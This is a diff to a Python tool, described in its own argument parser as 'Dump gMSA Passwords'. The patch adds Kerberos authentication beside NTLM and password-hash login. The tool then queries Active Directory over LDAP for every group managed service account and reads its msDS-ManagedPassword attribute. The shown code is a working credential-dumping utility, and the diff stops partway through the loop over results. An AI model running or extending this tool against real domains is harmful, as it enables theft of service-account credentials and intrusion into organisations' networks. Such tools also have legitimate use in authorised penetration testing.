@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
-from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
+from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
 import argparse
 import binascii
 from structure import Structure
 from Cryptodome.Hash import MD4
+import sys
 
 parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
-parser.add_argument('-u','--username', help='username for LDAP', required=True)
-parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)',required=True)
+parser.add_argument('-u','--username', help='username for LDAP', required=False)
+parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)',required=False)
+parser.add_argument('-k','--kerberos', help='use kerberos authentication',required=False, action='store_true')
 parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
 parser.add_argument('-d','--domain', help='Domain', required=True)
 
@@ -54,13 +56,29 @@ def base_creator(domain):
 
 def main():
     args = parser.parse_args()
+
+    if args.kerberos and (args.username or args.password):
+        print("-k and -u|-p options are mutually exclusive")
+        sys.exit(-1)
+    if args.password and not args.username:
+        print("specify a username or use -k for kerberos authentication")
+        sys.exit(-1)
+    if args.username and not args.password:
+        print("specify a password or use -k for kerberos authentication")
+        sys.exit(-1)    
+
     if args.ldapserver:
         server = Server(args.ldapserver, get_info=ALL)
     else:
         server = Server(args.domain, get_info=ALL)
-    conn = Connection(server, user='{}\\{}'.format(args.domain, args.username), password=args.password, authentication=NTLM, auto_bind=True)
+
+    if not args.kerberos:
+        conn = Connection(server, user='{}\\{}'.format(args.domain, args.username), password=args.password, authentication=NTLM, auto_bind=True)
+    else:
+        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
     conn.start_tls()
     success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
+    
     if success:
         for entry in conn.entries:
             try:
